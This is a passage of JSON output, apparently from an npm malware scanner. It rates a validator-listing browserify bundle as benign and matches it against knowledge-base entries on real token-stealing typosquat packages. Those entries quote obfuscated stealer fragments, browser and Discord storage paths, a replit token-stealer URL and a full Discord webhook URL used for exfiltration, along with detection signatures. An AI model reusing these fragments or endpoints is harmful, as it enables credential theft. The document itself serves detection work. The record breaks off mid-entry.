+          "code_snippet": "(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c=\"function\"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error(\"Cannot find module '\"+i+\"'\");throw a.code=\"MODULE_NOT_FOUND\",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u=\"function\"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){\nmodule.exports={\n    \"validators\": [\n        {\n            \"accountId\": \"148HzdSuFsDrNKnAHFs81BJzZxmKgwEC6Pmpw2QJnTy3Hv3R\",\n            \"identity\": {\n                \"display\": \"CoinFund/Grassfed\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"\",\n                \"email\": \"\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@coinfund_io\"\n            },\n            \"staked\": 127893899004000,\n            \"commission\": \"5%\"\n        },\n        {\n            \"accountId\": \"153YD8ZHD9dRh82U419bSCB5SzWhbdAFzjj4NtA5pMazR2yC\",\n            \"identity\": {\n                \"display\": \"SAXEMBERG\",\n                \"legal\": \"\",\n                \"web\": \"https://saxemberg.com/\",\n                \"riot\": \"@s_saxemberg:matrix.org\",\n                \"email\": \"hello@saxemberg.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@saxemberg\"\n            },\n            \"staked\": 158596045678684,\n            \"commission\": \"1.99%\"\n        },\n        {\n            \"accountId\": \"1cFsLn7o74nmjbRyDtMAnMpQMc5ZLsjgCSz9Np2mcejUK83\",\n            \"identity\": {\n                \"display\": \"Uno Staking\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@unostaking:matrix.org\",\n                \"email\": \"operator@unostaking.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@UnoStaking\"\n            },\n            \"staked\": 108144343179278,\n            \"commission\": \"3%\"\n        },\n        {\n            \"accountId\": \"12dvyqCFhVubTDqMdojyjhkxVUMaYVXWLv8uZW1NomUunPmN\",\n            \"identity\": {\n                \"display\": \"Nodeasy\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@crabbean:matrix.org\",\n                \"email\": \"wenzhihao@bitopia.cn\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@Nodeasy\"\n            },\n            \"staked\": 100485517591916,\n            \"commission\": \"3%\"\n        },\n        {\n            \"accountId\": \"1WG3jyNqniQMRZGQUc7QD2kVLT8hkRPGMSqAb5XYQM1UDxN\",\n            \"identity\": {\n                \"display\": \"DokiaCapital\",\n                \"legal\": \"\",\n                \"web\": \"https://staking.dokia.cloud\",\n                \"riot\": \"@awrelll:matrix.org\",\n                \"email\": \"\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 6044401583000000,\n            \"commission\": \"5%\"\n        },\n        {\n            \"accountId\": \"14Y4s6V1PWrwBLvxW47gcYgZCGTYekmmzvFsK1kiqNH2d84t\",\n            \"identity\": {\n                \"display\": \"RockX_Polkadot\",\n                \"legal\": \"RockX\",\n                \"web\": \"https://www.rockx.com\",\n                \"riot\": \"\",\n                \"email\": \"support@rockx.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@rockx_official\"\n            },\n            \"staked\": 36640701574454,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"15BQUqtqhmqJPyvvEH5GYyWffXWKuAgoSUHuG1UeNdb8oDNT\",\n            \"identity\": {\n                \"display\": \"HashQuark\",\n                \"legal\": \"HashQuark\",\n                \"web\": \"https://hashquark.io\",\n                \"riot\": \"\",\n                \"email\": \"contact@hashquark.io\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 251741039136241,\n            \"commission\": \"3%\"\n        },\n        {\n            \"accountId\": \"14ShUZUYUR35RBZW6uVVt1zXDxmSQddkeDdXf1JkMA6P721N\",\n            \"identity\": {\n                \"display\": \"Wei\",\n                \"legal\": \"Wei Tang\",\n                \"web\": \"https://that.world/~wei/\",\n                \"riot\": \"@wei:that.world\",\n                \"email\": \"wei@that.world\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 554005388214145,\n            \"commission\": \"3%\"\n        }\n    ],\n    \"era\": 623\n}\n},{}],2:[function(require,module,exports){\nconst latestKsm = require(\"./ksm/latest.json\");\nconst latestDot = require(\"./dot/latest.json\");\n\ndocument.addEventListener(\"DOMContentLoaded\", async () => {\n\n    document.getElementById(\"submit\").addEventListener(\"click\", async () => {\n        document.getElementById(\"status\").hidden = false;\n        const isKSM = document.getElementById(\"KSM\").checked;\n        let data;\n        if(isKSM) {\n            data = latestKsm;\n        } else {\n            data = latestDot;\n        }\n        document.getElementById(\"validators\").innerText = data.validators.map((v, i) => {\n            return `${++i}. address: ${v.accountId} commission: ${v.commission} name: ${v.identity.display}`;\n        }).join(\"\\n\");\n        document.getElementById(\"status\").innerText = `Validators meeting the criteria in era ${data.era}`;\n    });\n\n});\n},{\"./dot/latest.json\":1,\"./ksm/latest.json\":3}],3:[function(require,module,exports){\nmodule.exports={\n    \"validators\": [\n        {\n            \"accountId\": \"EDNEfKXHd645DPpBhLZjaEwp4sPhj4STjjS4QrMbFU1FqbZ\",\n            \"identity\": {\n                \"display\": \"luckyve\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@luckyve:matrix.org\",\n                \"email\": \"luckyvenode@gmail.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 100000000000000,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"J19LYGghRCe4Ct3VW4Vz1amMoUgogS1sh2FQvPWroKcDdb1\",\n            \"identity\": {\n                \"display\": \"SAXEMBERG\",\n                \"legal\": \"\",\n                \"web\": \"https://saxemberg.com/\",\n                \"riot\": \"@s_saxemberg:matrix.org\",\n                \"email\": \"\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@saxemberg\"\n            },\n            \"staked\": 212279931917384,\n            \"commission\": \"2%\"\n        },\n        {\n            \"accountId\": \"DY3hczPcJjHXScXkKwJZ7vgqTE4bZaCUa56XsAQH8gDzB7x\",\n            \"identity\": {\n                \"display\": \"♞GameTheory♜\",\n                \"legal\": \"\",\n                \"web\": \"https://gametheory.me\",\n                \"riot\": \"@game.theory:matrix.org\",\n                \"email\": \"mail@gametheory.me\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 102460158635369,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"HHxJGYkkxzYNpDmoGomwuGBc8mtZQDhyhvWiCgUpJttpR1K\",\n            \"identity\": {\n                \"display\": \"Po-Ku People ❤️\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@poku_node:matrix.org\",\n                \"email\": \"\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@PoKuPeople\"\n            },\n            \"staked\": 116637600000000,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"FSUwnu7Ehf7sKByaXvSTYoAfuTxybwqhubeGfQkho94syqo\",\n            \"identity\": {\n                \"display\": \"Web3 VC\",\n                \"legal\": \"Web3 Venture Capital\",\n                \"web\": \"https://web3.vc\",\n                \"riot\": \"@web3.vc:matrix.org\",\n                \"email\": \"hi@web3.vc\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@VentureWeb3\"\n            },\n            \"staked\": 2368275807833819,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"HKKT5DjFaUE339m7ZWS2yutjecbUpBcDQZHw2EF7SFqSFJH\",\n            \"identity\": {\n                \"display\": \"RMRK Multisig\",\n                \"legal\": \"\",\n                \"web\": \"https://rmrk.app\",\n                \"riot\": \"\",\n                \"email\": \"hello@rmrk.app\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@rmrkapp\"\n            },\n            \"staked\": 4085000000000000,\n            \"commission\": \"5%\"\n        },\n        {\n            \"accountId\": \"EAkB83iUA6vJFXqSzuwYXq8vdZD5kcKgTP7BZkVRQ3iCVqC\",\n            \"identity\": {\n                \"display\": \"TransX\",\n                \"legal\": \"TransX\",\n                \"web\": \"https://transx.io\",\n                \"riot\": \"@transx:matrix.org\",\n                \"email\": \"silver@transx.io\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@TransX11\"\n            },\n            \"staked\": 4004880786839309,\n            \"commission\": \"5%\"\n        },\n        {\n            \"accountId\": \"J12kKQz1qcCHBg36Txz2k9mNKYERhjKRRSshwUghT11medm\",\n            \"identity\": {\n                \"display\": \"lloyds.tech\",\n                \"legal\": \"LLoyds Blockchain Technology\",\n                \"web\": \"https://lloyds.tech\",\n                \"riot\": \"@lloyds.tech:matrix.org\",\n                \"email\": \"tech@lloyds.tech\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@lloyds_tech\"\n            },\n            \"staked\": 101557471494826,\n            \"commission\": \"6%\"\n        },\n        {\n            \"accountId\": \"F7Wa1su7NRSr6LWuhPWdXcQALDyzm8Vmev7WtV5jVPtJELs\",\n            \"identity\": {\n                \"display\": \"ANAMIX\",\n                \"legal\": \"ANAMIX\",\n                \"web\": \"https://anamix.top/\",\n                \"riot\": \"@dbpatty:matrix.org\",\n                \"email\": \"anamix@polkadot.pro\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 900665650031888,\n            \"commission\": \"5%\"\n        },\n        {\n            \"accountId\": \"EyTegKZ9DBvMkV6pMbjx2fRk3N2VLNNduuto1PGpYcEqRrX\",\n            \"identity\": {\n                \"display\": \"andreita-validator-0\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@andreita:matrix.org\",\n                \"email\": \"andreaf.speziale@gmail.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@andreafspeziale\"\n            },\n            \"staked\": 118763671962932,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"Ew4JDQENKYKdBkgW6bJfFqYYXaDw4kupXBrXyMcJoU6Lc9Z\",\n            \"identity\": {\n                \"display\": \"Amiga Staking\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"@amigastaking:matrix.org\",\n                \"email\": \"operator@amigastaking.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@AmigaStaking\"\n            },\n            \"staked\": 104156225861481,\n            \"commission\": \"10%\"\n        },\n        {\n            \"accountId\": \"F7hDMvu33u14QPXbkBzqF4CuuyyruB2xi6D3V7aUbY8KGpr\",\n            \"identity\": {\n                \"display\": \"SynerWork Inc\",\n                \"legal\": \"\",\n                \"web\": \"\",\n                \"riot\": \"\",\n                \"email\": \"staking@synerwork.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"\"\n            },\n            \"staked\": 103500000000000,\n            \"commission\": \"2%\"\n        },\n        {\n            \"accountId\": \"Gv8p4vhdr3iZR9C1PrFMCNtcCsLL6jAtpKXjqpzUm2Ams2Q\",\n            \"identity\": {\n                \"display\": \"🐼 PandaForce 🐼\",\n                \"legal\": \"\",\n                \"web\": \"https://www.pandaforcenodes.com/\",\n                \"riot\": \"@pandaforce:matrix.org\",\n                \"email\": \"info@pandaforcenodes.com\",\n                \"pgpFingerprint\": \"\",\n                \"image\": \"\",\n                \"twitter\": \"@PandaForceNodes\"\n            },\n            \"staked\": 122311142130933,\n            \"commission\": \"10%\"\n        }\n    ],\n    \"era\": 3356\n}\n},{}]},{},[2]);",
+          "is_malicious": false,
+          "malice_score": 0.49201467037200924,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time, the code loads hardcoded JSON data containing multiple validator account IDs, associated identities, web URLs (including https://saxemberg.com/, https://staking.dokia.cloud, https://www.rockx.com, https://hashquark.io, https://that.world/~wei/, https://web3.vc, https://rmrk.app, https://transx.io, https://lloyds.tech, https://anamix.top/, https://gametheory.me, https://www.pandaforcenodes.com/), emails, and social media handles. During user interaction (click event), it accesses this data and displays validator addresses, commissions, and names in the DOM. No network requests, file operations, or system executions occur. The presence of multiple hardcoded external URLs and emails in the data could facilitate targeted phishing or reconnaissance if used maliciously.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code statically includes hardcoded JSON data representing validator information with associated blockchain addresses, identities, and metadata. It only displays this data in the DOM upon user interaction without performing any network requests, file system access, obfuscation, or data exfiltration. Compared to the known malicious patterns, this code lacks any suspicious operations such as obfuscated code, credential harvesting, or automated system manipulation. The presence of external URLs and emails in the data is typical for validator metadata and does not itself indicate malicious intent. Therefore, the code is benign and serves a legitimate informational purpose.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240824_201020_374245_snippet_1",
+              "source_package": "@zitterorg/a-eius-dolorem (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201020_374245/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5288504362106323,
+              "code_similarity": 0.39016929268836975,
+              "behavior_similarity": 0.6675316095352173,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// web3c.js\n// Hardcoded blockchain addresses\n// (actual code is minimal or empty, but includes references to blockchain addresses)\nconst teaAddress = '0x1234567890abcdef...'; // Example address\n// ...rest of file is empty or contains only comments",
+                "code_behavior": "At import-time, the code statically references hardcoded blockchain addresses in a JavaScript file, with no functional logic or data processing, resulting in no operational effect but potentially linking the package to blockchain-based reward systems.",
+                "malice_analysis": {
+                  "why_suspicious": "Including hardcoded blockchain addresses in a file that otherwise contains no functional code is highly atypical and suggests the package may be used to game blockchain-based reward systems, act as a placeholder for future malicious payloads, or serve as a marker for automated reward collection.",
+                  "violated_expectations": "A legitimate npm package, especially one purporting to be an ESLint plugin, is expected to provide actual linting or utility functionality. Instead, this package is empty or contains only references to unrelated blockchain addresses, which is inconsistent with normal package development practices.",
+                  "similar_legitimate_use": "Some legitimate packages may include blockchain addresses for donation or configuration purposes, but not in the absence of all other meaningful functionality or code.",
+                  "key_indicators": [
+                    "Presence of hardcoded blockchain addresses in otherwise empty or non-functional files",
+                    "JavaScript files (e.g., lib/web3c.js) containing only comments or static address assignments",
+                    "No functional code or exports present in the file"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "lib/web3c.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "@zitterorg/a-eius-dolorem",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (2024-07-xx and later)",
+                  "why_malicious": "The package is part of a coordinated mass-flooding campaign targeting the npm registry. It publishes hundreds of thousands of functionally useless or near-empty packages, which strains registry infrastructure, risks denial-of-service (DoS) conditions, and pollutes the open source ecosystem. The packages are interlinked via dependencies, amplifying the impact and complicating removal, and may serve as a smokescreen for more targeted malicious activity or to exploit blockchain-based reward systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Mass publication of thousands of packages with gibberish or auto-generated names and minimal or empty code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Floods the npm registry, straining registry resources and polluting the open source ecosystem."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Each package declares dependencies on dozens or hundreds of other similarly named packages, creating a recursive dependency web.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Causes resource exhaustion during dependency resolution and complicates package removal for registry operators."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Packages reference hardcoded blockchain addresses, potentially to game blockchain-based reward systems or act as placeholders for future malicious code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "May enable the publisher to receive crypto tokens for publishing or referencing packages, or facilitate future malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Packages with minimal or empty code that statically reference hardcoded blockchain addresses",
+                    "Packages with package.json files declaring large numbers (dozens or hundreds) of dependencies on other similarly named, functionally empty packages from the same publisher",
+                    "Mass publication of packages with gibberish or auto-generated names within a short time frame, especially from a single publisher"
+                  ],
+                  "file_indicators": [
+                    "lib/web3c.js containing only comments or hardcoded blockchain addresses and no functional code",
+                    "package.json files with extensive dependencies on other @zitterorg/* packages that are also non-functional"
+                  ],
+                  "network_indicators": [
+                    "No direct network activity in package code, but indirect indicators include spikes in npm registry access and excessive dependency resolution requests during installation"
+                  ],
+                  "how_to_detect": "Monitor for packages with minimal or empty code, particularly those referencing hardcoded blockchain addresses in JavaScript files. Flag packages whose package.json declares large numbers of dependencies on other packages from the same publisher, especially when those dependencies are also functionally empty. Detect mass publication events involving gibberish or auto-generated package names from a single publisher. Registry operators should watch for sudden spikes in package publication rates and recursive dependency chains that could cause resource exhaustion or DoS conditions."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456673_snippet_1",
+              "source_package": "fallguys (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456673/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48756861686706543,
+              "code_similarity": 0.3849194049835205,
+              "behavior_similarity": 0.5902178287506104,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const _0x13e5 = ['post', 'exec', 'https://cdn.discordapp.com/avatars/', '/AppData/Local/Google/Chrome/User\\x20Data/Default/Local\\x20Storage/leveldb', '/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb', '/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb', '/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb', '/AppData/Roaming/discord/Local Storage/leveldb', ...];",
+                "code_behavior": "At import-time, the code defines an obfuscated array containing hardcoded file paths to browser and Discord local storage databases, loads these strings into memory, and prepares them for subsequent automated access, enabling targeted data harvesting.",
+                "malice_analysis": {
+                  "why_suspicious": "The use of obfuscated arrays to store file paths to browser and Discord storage locations is a strong indicator of credential and session theft malware, as it conceals the intent to access sensitive data.",
+                  "violated_expectations": "A legitimate package would not obfuscate or enumerate browser or Discord local storage file paths, nor would it require access to these locations without explicit user action and transparency.",
+                  "similar_legitimate_use": "Security auditing or backup tools may enumerate such files, but they do so transparently, with user consent, and without obfuscation.",
+                  "key_indicators": [
+                    "Obfuscated array of browser and Discord storage file paths",
+                    "Hardcoded references to leveldb directories for multiple browsers and Discord",
+                    "Preparation for automated file access at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "fallguys",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.6",
+                  "why_malicious": "The package 'fallguys' impersonates a legitimate API for the Fall Guys game but contains heavily obfuscated JavaScript code that, upon import, systematically locates, reads, and exfiltrates sensitive browser and Discord application data to a hardcoded Discord webhook. The package provides no legitimate functionality and is solely designed for credential and session theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Obfuscated file paths and sensitive strings are loaded into memory at import-time.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Automated enumeration of sensitive files"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Sensitive browser and Discord storage files are read from disk using filesystem APIs.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Data harvesting and preparation for exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Harvested data and user profile metadata are formatted into a JSON payload for webhook delivery.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Data exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Payload is sent to the attacker's Discord webhook endpoint via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Completion of data theft and attacker access to stolen credentials"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated arrays containing hardcoded browser and Discord storage file paths in JavaScript code",
+                    "Automated reading of browser and Discord local storage files at import-time without user interaction",
+                    "Network requests to Discord webhook endpoints with harvested sensitive data at import-time"
+                  ],
+                  "file_indicators": [
+                    "index.js containing obfuscated arrays of file paths referencing leveldb directories",
+                    "Access to /AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb and similar paths by non-browser processes",
+                    "References to Discord and multiple Chromium-based browser storage locations in package code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to discordapp.com/api/webhooks/746189410042904617/RQVJEOhzAblK5FlkQ-WIXkWfKfg5BFCdsjTeVueAIrVLaQMTvHgbuhuqFafPZYHfwnEq",
+                    "Outbound connections to Discord webhook endpoints from npm package processes"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that, at import-time, access browser or Discord local storage files and send their contents to external webhooks, especially Discord API endpoints. Flag any code that contains obfuscated arrays of sensitive file paths or constructs network requests to hardcoded webhook URLs. Alert on npm packages that read browser or IM storage files without user interaction and initiate outbound network connections to Discord webhook domains. Correlate filesystem access to leveldb directories with network activity to Discord webhooks for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456159_snippet_1",
+              "source_package": "colors-help (also colors_express, colors-helper) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456159/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.46682804822921753,
+              "code_similarity": 0.3803964853286743,
+              "behavior_similarity": 0.5532596111297607,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var colors = {};\nmodule['exports'] = colors;\nvar o=0x516c;var _0x4e2b=['fs','path','os','readdirSync','statSync','readFileSync','toString','match','POST','https://replit.com/@evilKaue/discord-token-stealer','writeFileSync'];(function(_0x3e2b,_0x2e2b){...})(_0x4e2b,o); // Obfuscated code\n// Deobfuscated: Iterates over browser and Discord folders, searches for Discord tokens using regex, exfiltrates via HTTP POST.",
+                "code_behavior": "At import-time, the code recursively scans browser and Discord local storage folders for files, uses a regular expression to extract Discord authentication tokens, and sends any discovered tokens via HTTP POST to attacker-controlled domains, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is obfuscated and executes immediately upon import, accessing sensitive directories associated with browsers and Discord to extract authentication tokens. It then exfiltrates these tokens to external domains, which is a hallmark of info-stealer malware.",
+                  "violated_expectations": "A legitimate color formatting library should not access browser or Discord storage folders, nor should it perform network communication to external endpoints, especially not to exfiltrate sensitive data.",
+                  "similar_legitimate_use": "While some legitimate applications may access browser storage for backup or migration, a color utility library has no valid reason to interact with these folders or transmit data externally.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript in a core library file (colors.js)",
+                    "Access to browser and Discord storage folders such as /AppData/Roaming/discord*/Local Storage/leveldb",
+                    "Use of regular expressions to search for Discord token patterns",
+                    "HTTP POST requests to non-standard, attacker-controlled domains (e.g., replit.com/@evilKaue/discord-token-stealer, pegapiranha.com)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "colors.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "colors-help (also colors_express, colors-helper)",
+                  "package_manager": "npm",
+                  "package_versions": "1.4.0 (and other versions published in April/May 2022)",
+                  "why_malicious": "These packages are typosquats of the legitimate 'colors' library and contain heavily obfuscated JavaScript code that, upon installation or import, searches the user's filesystem for Discord authentication tokens and session data, then exfiltrates this sensitive information to attacker-controlled endpoints via HTTP POST requests. The packages also load remote code in Electron/Discord contexts to enable real-time credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious package, which immediately loads obfuscated code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token search and exfiltration"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code scans browser and Discord storage folders, searching for Discord authentication tokens using regular expressions.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Token exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted tokens are sent via HTTP POST requests to attacker-controlled endpoints, including Replit-hosted and custom domains.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives Discord tokens"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In Electron or Discord app contexts, additional remote code is loaded, which hooks into web requests to extract and exfiltrate tokens in real time.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Continuous credential theft and real-time exfiltration"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of obfuscated JavaScript in core library files (e.g., colors.js)",
+                    "Access to browser and Discord local storage folders (e.g., /AppData/Roaming/discord*/Local Storage/leveldb)",
+                    "Use of regular expressions to search for Discord token patterns in local files",
+                    "HTTP POST requests to non-standard, attacker-controlled domains (e.g., replit.com/@evilKaue/discord-token-stealer, pegapiranha.com, kauaudeou.space)",
+                    "Use of Electron APIs (electron, session.defaultSession.webRequest) in packages not intended for Electron apps",
+                    "Loading and execution of remote code from hardcoded URLs"
+                  ],
+                  "file_indicators": [
+                    "colors.js containing obfuscated code",
+                    "Unexpected access to /AppData/Roaming/discord*/Local Storage/leveldb",
+                    "Unexpected access to browser Local Storage/leveldb folders",
+                    "Presence of remote code loading logic referencing pegapiranha.com or similar domains"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to Replit-hosted endpoints (e.g., replit.com/@evilKaue/discord-token-stealer)",
+                    "HTTP POST requests to pegapiranha.com or kauaudeou.space domains",
+                    "Outbound requests to suspicious webhook endpoints (e.g., /api/webhooks/evilKaue)"
+                  ],
+                  "how_to_detect": "Monitor npm packages, especially those typosquatting popular libraries, for obfuscated JavaScript in core files. Flag any package that accesses browser or Discord storage folders, searches for Discord token patterns, or sends HTTP POST requests to non-standard or known malicious domains. Alert on use of Electron APIs in packages not intended for Electron apps, and on the presence of remote code loading from hardcoded URLs. Correlate file access to Discord/browser storage with outbound network activity to identified malicious endpoints for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456219_snippet_1",
+              "source_package": "colors-3.0 (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456219/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4623347520828247,
+              "code_similarity": 0.34046265482902527,
+              "behavior_similarity": 0.5842068791389465,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('...obfuscated code...'))",
+                "code_behavior": "At import-time, the code executes heavily obfuscated JavaScript, which reads browser and Discord application leveldb files, extracts authentication tokens, and sends them to a hardcoded Discord webhook URL, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The presence of heavily obfuscated code in a core library file is a strong indicator of malicious intent, especially when the code accesses sensitive user directories and performs network exfiltration.",
+                  "violated_expectations": "A legitimate colors library should only provide string formatting utilities and should not access user files or perform any network operations.",
+                  "similar_legitimate_use": "While minification is common for performance, the combination of obfuscation, filesystem access, and network exfiltration is not expected in a utility library.",
+                  "key_indicators": [
+                    "Heavily obfuscated or minified code in a core utility file",
+                    "Access to browser and Discord application data directories (leveldb)",
+                    "Network requests to hardcoded Discord webhook URLs"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "lib/colors.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "colors-3.0",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 (and other typosquat variants: colors2.0, colors-2.2.0, colorsss, grabbir, nocuzune, wixdev2022-1)",
+                  "why_malicious": "These packages are typosquats of the popular 'colors' npm package, designed to deceive developers into installing them. Instead of providing legitimate color formatting utilities, they contain malicious code that steals Discord tokens and browser credentials, exfiltrates sensitive data to attacker-controlled webhooks, and can establish reverse shells for remote access."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious typosquat package (e.g., colors-3.0).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded at import-time or during test script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Obfuscated or unobfuscated JavaScript executes, scanning for browser and Discord application data directories.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Extraction of sensitive authentication tokens and credentials."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted tokens are exfiltrated to a hardcoded Discord webhook.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
